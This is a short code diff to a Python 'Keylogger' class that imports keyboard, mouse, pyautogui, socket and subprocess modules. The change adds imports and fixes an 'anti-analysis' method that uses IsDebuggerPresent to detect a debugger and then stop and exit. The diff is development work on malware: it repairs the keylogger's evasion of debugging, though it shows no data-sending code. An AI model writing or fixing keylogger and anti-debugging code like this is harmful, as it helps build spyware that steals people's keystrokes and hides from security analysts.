@@ -1,4 +1,5 @@
 # -*- coding: utf-8 -*-
+import ctypes
 import keyboard
 import logging
 import mouse
@@ -7,6 +8,7 @@ import platform
 import pyautogui
 import socket
 import subprocess
+import sys
 import time
 import utils
 from datetime import datetime, timedelta
@@ -209,7 +211,7 @@ class Keylogger:
 
 #--------------- Anti-analysis-techniques----------#
     def anti_debug(self):
-        debugger_is_present = windll.kernel32.IsDebuggerPresent()
+        debugger_is_present = ctypes.windll.kernel32.IsDebuggerPresent()
         if debugger_is_present:
             self.stop()
             exit()
